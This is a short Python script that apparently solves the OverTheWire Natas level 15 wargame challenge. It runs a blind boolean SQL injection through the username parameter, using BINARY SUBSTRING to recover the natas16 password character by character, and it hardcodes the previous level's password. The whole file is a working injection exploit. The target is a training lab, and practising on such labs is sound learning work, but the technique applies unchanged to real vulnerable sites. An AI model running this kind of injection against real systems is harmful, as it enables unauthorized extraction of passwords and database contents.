import requests as req
import string

url = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16"+and+BINARY+SUBSTRING(password,%i,1)+=+"%s'
symbols = string.ascii_letters+"1234567890"
password15 = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
password16 = ""

def check_symbol(index):
	global password16
	for s in symbols:
		r = req.post(url=url % (index, s), auth=("natas15", password15))
		
		if r.text.count('This user exists.'):
			password16 += s
			break
		else:
			continue

if __name__ == '__main__':
	for i in range(1, len(password15)+1):
		check_symbol(i)
		print("\r"+password16, end="")
	print("\nComplete!\nCredentials data { natas16:%s }" % password16)